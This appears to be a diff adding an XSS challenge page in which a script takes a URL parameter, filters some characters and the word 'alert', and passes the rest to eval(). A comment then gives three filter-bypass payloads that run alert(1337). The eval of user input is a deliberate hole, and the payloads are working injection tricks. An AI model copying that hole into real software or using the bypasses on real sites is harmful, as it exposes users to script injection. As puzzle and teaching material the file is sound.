@@ -1,0 +1,16 @@
+<script>
+/* Challenge */
+mafia = (new URL(location).searchParams.get('mafia') || '1+1')
+mafia = mafia.slice(0, 50)
+mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')
+mafia = mafia.replace(/alert/g, '_')
+eval(mafia)
+</script>
+
+<!--
+    Function(/ALERT(1337)/.source.toLowerCase())()
+
+    eval(8680439..toString(30))(1337)
+
+    eval(location.hash.slice(1))#alert(1337)
+-->
